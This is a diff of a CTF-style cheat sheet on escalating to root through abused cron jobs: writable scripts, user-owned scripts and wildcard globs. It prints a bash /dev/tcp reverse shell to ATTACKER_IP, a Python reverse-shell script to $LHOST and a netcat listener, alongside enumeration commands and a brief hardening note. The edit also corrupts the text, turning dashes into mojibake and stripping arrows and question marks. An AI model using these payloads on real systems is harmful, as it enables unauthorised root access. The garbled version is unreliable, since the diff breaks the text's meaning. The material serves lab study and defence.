@@ -1,4 +1,4 @@
-# Cron Script Abuse — Writable / User-Owned / Wildcard
+# Cron Script Abuse â€” Writable / User-Owned / Wildcard
 
 Used on: **Team**, **bsidesgtdevelpy**
 
@@ -12,11 +12,11 @@ A script executed by root's crontab is somehow under attacker control: directly 
 ## How It Works
 
 ```
-root crontab ? /opt/admin_stuff/script.sh (every minute)
-    ? calls /usr/local/bin/main_backup.sh
-        ? main_backup.sh writable by `editors` group
-            ? attacker in `editors` group
-                ? append reverse shell payload ? root execution
+root crontab  /opt/admin_stuff/script.sh (every minute)
+     calls /usr/local/bin/main_backup.sh
+         main_backup.sh writable by `editors` group
+             attacker in `editors` group
+                 append reverse shell payload  root execution
 ```
 
 ## Steps
@@ -56,13 +56,13 @@ whoami
 
 `-p` preserves the effective UID (required when bash detects SUID).
 
-## Alternative — Reverse Shell Payload
+## Alternative â€” Reverse Shell Payload
 
 ```bash
 echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /usr/local/bin/main_backup.sh
 ```
 
-## Variant — Root cron runs a user-owned script (bsidesgtdevelpy)
+## Variant â€” Root cron runs a user-owned script (bsidesgtdevelpy)
 
 ```bash
 cat /etc/crontab
@@ -70,23 +70,23 @@ cat /etc/crontab
 # *  *    * * *   king    cd /home/king/   && bash run.sh
 ```
 
-Looks fine — until you read `run.sh`:
+Looks fine â€” until you read `run.sh`:
 ```bash
 cat /home/king/run.sh
 # socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
 ```
 
-`run.sh` lives in king's home and is **owned by king**, but `/etc/crontab` also schedules `root` to `cd /root/company && bash run.sh`. **You don't need to write the root-side cron script** — you just need to write the file the root-side script `python /root/company/media/*.py` glob pulls in:
+`run.sh` lives in king's home and is **owned by king**, but `/etc/crontab` also schedules `root` to `cd /root/company && bash run.sh`. **You don't need to write the root-side cron script** â€” you just need to write the file the root-side script `python /root/company/media/*.py` glob pulls in:
 
 ```bash
 cat /root/company/run.sh
-# python /root/company/media/*.py     ? wildcard glob == attacker-controlled
+# python /root/company/media/*.py      wildcard glob == attacker-controlled
 ```
 
-So drop a `.py` into `/root/company/media/` (via a sibling write — bsidesgtdevelpy's foothold was a webapp upload that landed there), wait for the cron tick, get a root reverse shell.
+So drop a `.py` into `/root/company/media/` (via a sibling write â€” bsidesgtdevelpy's foothold was a webapp upload that landed there), wait for the cron tick, get a root reverse shell.
 
 ```python
-# attack.py — dropped into /root/company/media/
+# attack.py â€” dropped into /root/company/media/
 import socket,subprocess,os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("$LHOST", 1337))
@@ -97,11 +97,11 @@ subprocess.call(["/bin/sh", "-i"])
 ```bash
 # Listener
 nc -lvnp 1337
-# … wait one minute …
-# whoami ? root
+# â€¦ wait one minute â€¦
+# whoami  root
 ```
 
-## Variant — Wildcard glob pulls in attacker files
+## Variant â€” Wildcard glob pulls in attacker files
 
 Any cron line of the form `cd /some/dir && tar cf /backup *.txt` or `python /opt/scripts/*.py` is **wildcard injection**. If you can write to the glob target dir:
 
@@ -117,25 +117,25 @@ See <https://gtfobins.org/> for `tar`, `find`, `chown`, `chmod` wildcard-injecti
 ## How to Find It
 
 ```bash
-cat /etc/crontab                                # [USED — Team, bsidesgtdevelpy]
-ls -la /etc/cron.d/ /etc/cron.*                 # [USED — CCTV, Team]
+cat /etc/crontab                                # [USED â€” Team, bsidesgtdevelpy]
+ls -la /etc/cron.d/ /etc/cron.*                 # [USED â€” CCTV, Team]
 cat /etc/cron.d/*
 cat /var/spool/cron/crontabs/* 2>/dev/null
 systemctl list-timers --all                     # systemd equivalents
 
 # Watch short-lived jobs you'd otherwise miss
-# (drop pspy from your attacker box — see linux-enumeration.md)
+# (drop pspy from your attacker box â€” see linux-enumeration.md)
 ./pspy64 -pf -i 1000
 
 # Plain bash poll if pspy isn't an option
-tail -f /var/log/syslog | grep -i cron          # [USED — bsidesgtdevelpy]
+tail -f /var/log/syslog | grep -i cron          # [USED â€” bsidesgtdevelpy]
 ```
 
 For every cron that runs as root, ask:
-1. Who owns the script? Is it me?
-2. Is the script writable by my user / a group I'm in?
-3. Does the script call another script (`./run.sh`, `bash run.sh`)? Recurse the question.
-4. Does the script use a wildcard glob over a dir I can write to?
+1. Who owns the script Is it me
+2. Is the script writable by my user / a group I'm in
+3. Does the script call another script (`./run.sh`, `bash run.sh`) Recurse the question.
+4. Does the script use a wildcard glob over a dir I can write to
 
 ## Defensive Note
 
@@ -148,7 +148,7 @@ chown root:root /usr/local/bin/main_backup.sh
 Avoid wildcards in privileged cron lines. If you must, use absolute file lists or `find ... -exec`.
 
 ## Related
-- [linux-enumeration.md](../enumeration/linux-enumeration.md) — where the cron sweep lives
-- [python-input-injection.md](../web-rce/python-input-injection.md) — bsidesgtdevelpy's foothold that fed into this privesc
+- [linux-enumeration.md](../enumeration/linux-enumeration.md) â€” where the cron sweep lives
+- [python-input-injection.md](../web-rce/python-input-injection.md) â€” bsidesgtdevelpy's foothold that fed into this privesc
 
 
